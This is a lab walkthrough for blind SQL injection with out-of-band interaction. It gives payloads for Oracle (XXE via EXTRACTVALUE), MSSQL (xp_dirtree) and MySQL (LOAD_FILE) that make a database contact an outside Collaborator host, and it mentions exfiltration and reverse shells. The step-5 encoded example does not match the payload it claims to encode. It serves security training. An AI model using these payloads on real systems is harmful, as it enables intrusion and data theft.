# 🎯 Blind SQL Injection with Out-of-Band Interaction – Lab Walkthrough 🎯

🎥 **Hi everyone!**  
we’re diving into **Lab #15: Blind SQL Injection with Out-of-Band Interaction**. Let’s roll up our sleeves and exploit this vulnerability like a pro. 💻🔒

## 🔍 **Lab Overview**

- **Objective**: Exploit a **blind SQL injection** vulnerability that doesn’t return any data in the response.
- **Vulnerable Parameter**: `TrackingId` cookie used for analytics.
- **Key Twist**: The SQL query is executed **asynchronously**, so we won’t see direct feedback from our payload.
- **Solution Strategy**: Use **out-of-band (OOB) interaction** to trigger a DNS lookup to **Burp Collaborator**.

> ⚠️ You need **Burp Suite Professional** to complete this lab. The Community Edition won't work because it lacks Collaborator support.

## 🧪 Step-by-Step Guide 🧪✨

### 1️⃣ **Open Burp Collaborator Client**

🟢 Go to **Burp > Collaborator > Copy to clipboard**  
📌 Paste your unique collaborator domain somewhere safe (e.g., `xyzabc123.oastify.net`)  
🧠 This is how we’ll know our attack worked — if we see an interaction from the server to this domain!

### 2️⃣ **Capture the Request with Burp Proxy**

🌐 Visit the lab homepage  
🔌 Ensure **FoxyProxy/Burp Proxy is active**  
🔁 Intercept the request in **Proxy > HTTP History**  
📤 Right-click → **Send to Repeater**

### 3️⃣ **Analyze the Vulnerable Parameter**

🍪 Look at the `TrackingId` cookie value  
It probably looks something like:
```
TrackingId=abc123xyz;
```

This cookie is being used in a backend SQL query — and it's **not properly sanitized** 🚨

### 4️⃣ **Craft Your OOB SQL Injection Payload**

We don’t know the database type, so we'll start with **Oracle payloads** since they're commonly exploitable via XXE for OOB interactions.

#### 📦 Oracle XXE-based DNS Lookup Payload (Unpatched):
```sql
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

🧩 Replace `BURP-COLLABORATOR-SUBDOMAIN` with your actual subdomain from step 1.

### 5️⃣ **URL Encode the Payload**

✅ In Burp Repeater, select the payload → **Ctrl + U** to URL encode it  
📘 This ensures special characters are handled correctly by the server.

Example:
```
TrackingId='+UNION+SELECT+EXTRACTVALUE(xmltype('%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+root+%5B+...
```

### 6️⃣ **Send the Modified Request**

🔄 Hit **Send** in Repeater  
🕒 Wait a few seconds  
🔁 Click **Poll Now** in the Collaborator tab

👀 If everything worked, you should see a new interaction from the application's IP address!

### 7️⃣ **Success! 🎉**

🎉 Congratulations! You triggered a DNS lookup using SQL injection.  
✅ The lab is now solved!

## 🛡️ Real-World Tip:

While this lab only asks for a DNS lookup, in real-world scenarios, attackers can use similar techniques to:
- Exfiltrate sensitive data 📤
- Trigger reverse shells 🐚
- Enumerate internal networks 🌐

Always validate and sanitize all user input to prevent such attacks!

## 📝 Summary Checklist ✅

| Step | Action |
|------|--------|
| 🔹 | Open Burp Collaborator & copy your subdomain |
| 🔹 | Send home page request to Repeater |
| 🔹 | Inject OOB payload into TrackingId cookie |
| 🔹 | URL encode the payload |
| 🔹 | Send the modified request |
| 🔹 | Check Collaborator for DNS interaction |
| 🔹 | Celebrate success 🎊 |

## 📚 Bonus: Different DB Payloads

If Oracle doesn’t work, try other DB-specific payloads:

### Microsoft SQL Server 🖥️
```sql
'; exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
```

### MySQL 🗄️
```sql
AND LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\test.txt')
```

Remember to adjust syntax and encoding accordingly!

## 🎬 Final Words

This was a fun dive into **Blind SQL Injection with out-of-band interaction**! It shows how even when you get **no visible feedback**, you can still confirm exploitation through external channels like DNS lookups.
💬 Drop questions or thoughts in the comments — happy hacking! 🛠️👾

🔐 Until next time, stay secure and keep learning!  

